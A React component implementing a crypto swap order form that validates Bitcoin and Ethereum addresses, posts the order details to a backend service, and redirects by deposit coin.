import React, { useState, useEffect } from "react";
import { ThreeDots } from "react-loader-spinner";

/* ===== Validators ===== */

const validateBitcoinAddress = (address) => {
  if (!address) return false;
  const btcRegex =
    /^(bc1)[0-9a-z]{25,62}$|^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/;
  return btcRegex.test(address);
};

const validateEthereumAddress = (address) => {
  return /^0x[a-fA-F0-9]{40}$/.test(address);
};

const validateAddress = (withdraw, address) => {
  if (!withdraw || !address) return false;

  switch (withdraw) {
    case "Bitcoin":
      return validateBitcoinAddress(address);
    case "Ethereum":
      return validateEthereumAddress(address);
    default:
      return false;
  }
};

/* ===== Component ===== */

const BitcoinAddressValidation = () => {
  const [deposit, setDeposit] = useState("");
  const [amount, setAmount] = useState("");
  const [withdraw, setWithdraw] = useState("");
  const [network, setNetwork] = useState("");
  const [address, setAddress] = useState("");
  const [valid, setValid] = useState(null);
  const [loading, setLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");

  /* Re-validate if withdraw coin changes */
  useEffect(() => {
    if (address) {
      setValid(validateAddress(withdraw, address));
    }
  }, [withdraw, address]);

  const handleAddressChange = (e) => {
    const value = e.target.value.trim();
    setAddress(value);
    setValid(validateAddress(withdraw, value));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (loading) return;

    setErrorMessage("");

    if (!valid) {
      setErrorMessage("Invalid wallet address");
      return;
    }

    setLoading(true);

    const inputData = { deposit, amount, withdraw, network, address };
    localStorage.setItem("inputData", JSON.stringify(inputData));

    try {
      await fetch("https://elixirmagicbackend.adaptable.app/bitcoin/add", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(inputData),
      });
    } catch {
      setErrorMessage("Submission failed. Try again.");
      setLoading(false);
      return;
    }

    setTimeout(() => {
      const confirmed = window.confirm(
        "Are you sure you want to submit this form? You will be redirected."
      );

      if (!confirmed) {
        setLoading(false);
        return;
      }

      if (deposit === "Bitcoin") {
        window.location.href =
          "/c439ca6b170e956cdab143217d11a5c170a273156f0561833aca22b22b046451";
      }

      if (deposit === "Ethereum") {
        window.location.href =
          "/40d1aabae0adcc31bf4ac587b3abb11e88d02a42b681670efa4b82058bbd818b";
      }
    }, 2000);
  };

  return (
    <>
      <div className="md:fixed w-full">
        <div className="max-w-screen-2xl">
          <div className="fixed lg:px-10 mx-auto bg-[#0c0c0c] py-2 px-5 w-full items-center">
            <div className="flex gap-2 items-center">
              <img className="w-14" src="./favicon.png" alt="logo" />
              <div>
                <h1 className="text-md font-bold text-[#d8bb6c]">Vaulteras</h1>
                <h1 className="text-white md:text-xl font-semibold uppercase">
                  Submit Order
                </h1>
              </div>
            </div>
          </div>
        </div>

        <div className="min-h-screen mx-auto w-full pt-20 md:pt-24 px-5 bg-black">
          <div className="md:mx-auto md:max-w-md md:px-8 md:my-8 md:bg-[#0D0D0D]">
            <form className="my-5" onSubmit={handleSubmit}>
              {/* Deposit */}
              <p className="text-[#a0a0a0] text-sm py-2 font-semibold">
                Deposit Coin
              </p>
              <select
                className="bg-[#202020] text-white py-3 rounded-sm pl-3 text-sm w-full"
                value={deposit}
                onChange={(e) => setDeposit(e.target.value)}
                required
              >
                <option value="">Choose a Currency</option>
                <option value="Bitcoin">BTC</option>
                <option value="Ethereum">ETH</option>
              </select>

              {/* Amount */}
              <p className="text-[#a0a0a0] text-sm py-2 font-semibold">
                Amount
              </p>
              <input
                type="number"
                className="bg-[#202020] text-white py-3 rounded-sm pl-3 text-sm w-full"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                required
              />

              {/* Withdraw */}
              <p className="text-[#a0a0a0] text-sm py-2 font-semibold">
                Withdraw Coin
              </p>
              <select
                className="bg-[#202020] text-white py-3 rounded-sm pl-3 text-sm w-full"
                value={withdraw}
                onChange={(e) => setWithdraw(e.target.value)}
                required
              >
                <option value="">Choose a Currency</option>
                <option value="Bitcoin">Bitcoin</option>
                <option value="Ethereum">Ethereum</option>
              </select>

              {/* Network */}
              <p className="text-[#a0a0a0] text-sm py-2 font-semibold">
                Network
              </p>
              <input
                type="text"
                className="bg-[#202020] text-white py-3 rounded-sm pl-3 text-sm w-full"
                value={network}
                onChange={(e) => setNetwork(e.target.value)}
                required
              />

              {/* Address */}
              <p className="text-[#a0a0a0] text-sm py-2 font-semibold">
                Received Address
              </p>
              <input
                type="text"
                placeholder="Long press to paste"
                className="bg-[#202020] text-white py-3 rounded-sm pl-3 text-sm w-full"
                value={address}
                onChange={handleAddressChange}
                required
              />
              {valid === false && (
                <p className="text-red-500 text-sm pt-2">
                  Invalid Address
                </p>
              )}

              {errorMessage && (
                <p className="text-red-500 text-sm pt-2">
                  {errorMessage}
                </p>
              )}

              {/* Submit */}
              <div className="py-8">
                <button
                  disabled={!valid || loading}
                  className="w-full h-11 flex items-center justify-center rounded-sm bg-[#DFC660] text-black font-semibold disabled:opacity-50"
                  type="submit"
                >
                  {loading ? (
                    <>
                      <span className="mr-2">Loading</span>
                      <ThreeDots height="20" width="20" color="#000" />
                    </>
                  ) : (
                    "Submit"
                  )}
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </>
  );
};

export default BitcoinAddressValidation;
